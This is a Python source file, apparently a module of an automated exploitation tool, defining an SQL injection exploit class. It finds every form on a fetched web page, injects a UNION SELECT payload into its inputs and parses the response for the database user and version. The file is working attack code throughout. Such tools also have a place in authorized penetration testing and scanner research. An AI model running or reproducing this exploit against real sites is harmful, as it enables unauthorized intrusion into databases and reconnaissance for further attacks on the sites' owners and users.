from bs4 import BeautifulSoup
from lib.exploit import Exploit

class SQLInjectionExploit(Exploit):
	def __init__(self):
		Exploit.__init__(self)
		self.name = "db extraction"

	def run(self, request, body, url):
		parsed_html = BeautifulSoup(body, 'html.parser')
		forms = parsed_html.find_all('form')

		if len(forms) > 0:
			for form in forms:
				inputs = form.find_all('input')
				method = 'POST'

				if form['method']:
					method = form['method']

				result = self.send_payload(request, inputs, method, url)

				if result != False:
					return result

		return False

	def send_payload(self, request, inputs, method, url):
		exploit_query = "' or 1=2 UNION SELECT (SELECT CONCAT('TT_VERSION|',@@version)) as first_name, (SELECT CONCAT('TT_USER|',user())) as last_name from users#"
		payload = self.create_payload(inputs, exploit_query)
		exploit_successful = False

		if payload:
			if method == "GET":
				url = "%s?%s" % (url, request.encode_params(payload))

			request.send(url, method)
			html_body = request.get_body()
			html_body = html_body.replace(exploit_query, "")
			

			if html_body.find('TT_VERSION|') != -1 and html_body.find('TT_USER|') != -1:
				db_version = html_body[html_body.find('TT_VERSION|'):]
				db_version = db_version.split(" ",1)[0]
				db_version = db_version.split("<",1)[0]
				db_version = db_version.replace("TT_VERSION|", "")
				db_user = html_body[html_body.find('TT_USER|'):]
				db_user = db_user.split(" ",1)[0]
				db_user = db_user.split("<",1)[0]
				db_user = db_user.replace("TT_USER|", "")

				exploit_successful = "DB_USER: %s, DB_VERSION: %s" % (db_user, db_version)
				return exploit_successful

		return exploit_successful
